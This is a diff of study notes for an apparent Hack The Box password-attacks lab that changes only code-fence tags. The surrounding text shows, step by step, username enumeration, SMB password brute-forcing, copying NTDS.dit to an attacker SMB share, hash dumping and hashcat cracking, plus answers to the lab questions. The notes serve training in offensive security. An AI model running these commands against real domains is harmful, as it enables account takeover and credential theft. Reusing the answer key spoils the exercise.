@@ -44,7 +44,7 @@ Once a Windows system is joined to a domain, **it will no longer default to refe
 ### Creating a custom list of usernames
 We can manually create our list(s) or use an **automated list generator** such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
 
 ben
@@ -65,7 +65,7 @@ williamson
 ### Enumerating valid usernames with Kerbrute
 We can do this with a tool like [Kerbrute](https://github.com/ropnop/kerbrute). Kerbrute can be used for brute-forcing, password spraying and username enumeration.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
 
     __             __               __     
@@ -86,7 +86,7 @@ Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop
 ### Launching a brute-force attack with NetExec
 Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 
 SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
@@ -108,7 +108,7 @@ In this example, NetExec is using SMB to attempt to logon as user (`-u`) `bwilli
 ### Connecting to a DC with Evil-WinRM
 We can connect to a target DC using the credentials we captured.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
 
@@ -218,7 +218,7 @@ We can then copy the NTDS.dit file from the volume shadow copy of `C:` onto anot
 
 Before copying `NTDS.dit` to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -247,7 +247,7 @@ The operation completed successfully.
 ### Extracting hashes from NTDS.dit
 With a copy of `NTDS.dit` and `SYSTEM` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's **secretsdump**:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -267,7 +267,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
 ### A faster method: Using NetExec to capture NTDS.dit
 This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
 SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
@@ -316,7 +316,7 @@ NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob
 
 ## Cracking hashes and gaining credentials
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
@@ -332,7 +332,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
 2. Submit the NT hash associated with the Administrator user from the example output in the section reading. **Answer: 64f12cddaa88057e06a81b54e73b949b**
 3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive) **Answer: P@ssword!**
    - Use `ldapsearch` to find the target's domain controller name: `ILF.local`
-        ```sh
+        ```shellsession
         $ ldapsearch -x -H ldap://10.129.6.187 -b "" -s base namingContexts
         # extended LDIF
         #
@@ -358,7 +358,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
         # numEntries: 1
         ```
    - Create a custom username file with this content:
-        ```sh
+        ```shellsession
         # usernames.txt
         John Marston
         Carol Johnson
@@ -366,7 +366,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
         ```
    - `$ ./username-anarchy -i usernames.txt > names.txt` → Convert into common username formats.
    - Use `kerbrute` to enumerate valid usernames:
-        ```sh
+        ```shellsession
         $ ./kerbrute_linux_amd64 userenum --dc 10.129.6.187 --domain ILF.local ../../username-anarchy/names.txt 
 
             __             __               __     
@@ -386,7 +386,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
         2026/02/24 08:30:43 >  Done! Tested 43 usernames (3 valid) in 1.229 seconds
         ```
    - Use `netexec` to bruteforce `jmarston` account:
-        ```sh
+        ```shellsession
         $ netexec smb 10.129.6.187 -u jmarston -p /usr/share/wordlists/fasttrack.txt
         <SNIP>
         SMB         10.129.6.187    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
@@ -394,7 +394,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
 4. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive) **Answer: Winter2008**
    - `$ evil-winrm -i 10.129.6.187 -u jmarston -p 'P@ssword!'` → Connect to the DC with the admin credential
    - Dump `jstapleton`'s NTLM hash from the `NTDS.dit` file using `netexec ntdsutil` module: `92fd67fd2f49d0e83744aa82363f021b`
-        ```sh
+        ```shellsession
         $ netexec smb 10.129.6.187 -u jmarston -p 'P@ssword!' -M ntdsutil
         SMB         10.129.6.187    445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
         SMB         10.129.6.187    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
@@ -419,7 +419,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
         NTDSUTIL    10.129.6.187    445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1863259/.nxc/logs/ILF-DC01_10.129.6.187_2026-02-24_091412.ntds | cut -d ':' -f1
         ```
         or the traditional way
-        ```sh
+        ```shellsession
         # Start a SMB Server
         $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData .
         # Connect to the DC and transfer the NTDS.dit and SYSTEM registry hive to attack host
@@ -440,7 +440,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
         <SNIP>
         ```
    - Crack the hash offline using `hashcat`:
-        ```sh
+        ```shellsession
         $ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
         <SNIP>
         92fd67fd2f49d0e83744aa82363f021b:Winter2008
